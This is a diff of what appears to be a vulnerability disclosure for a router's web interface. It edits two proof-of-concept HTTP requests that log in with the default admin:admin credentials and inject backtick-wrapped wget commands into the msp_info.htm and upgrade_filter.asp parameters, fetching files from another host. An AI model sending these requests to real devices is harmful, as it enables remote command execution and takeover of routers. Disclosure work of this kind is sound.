@@ -40,7 +40,7 @@ affect version:
 After logging in with the default password admin:admin, accessing the msp_info.htm page, and crafting carefully constructed parameters, it is possible to execute commands.
 
 ```
-GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/aaa` HTTP/1.1
+GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/test.txt` HTTP/1.1
 
 Host: 192.168.0.1
 
@@ -63,7 +63,8 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-![image](https://github.com/user-attachments/assets/982f8b00-e411-4090-8fe1-27511d0a909f)
+![image](https://github.com/user-attachments/assets/abdbb041-80de-4be0-9fac-5daf0fd8047b)
+
 
 
 
@@ -83,7 +84,7 @@ After logging in with the default password admin:admin, accessing the upgrade_fi
 poc
 
 ```
-GET /upgrade_filter.asp?path=http://`wget%20http://192.168.0.2:8000/asdf` HTTP/1.1
+GET /upgrade_filter.asp?path=http://`wget%20http://192.168.0.2:8000/test2.txt` HTTP/1.1
 
 Host: 192.168.0.1
 
@@ -104,4 +105,5 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-![image](https://github.com/user-attachments/assets/092f686d-6854-488d-8f3b-f1d7291c07ce)
+![image](https://github.com/user-attachments/assets/5d0b48f0-d26f-4530-abaf-907accc36710)
+
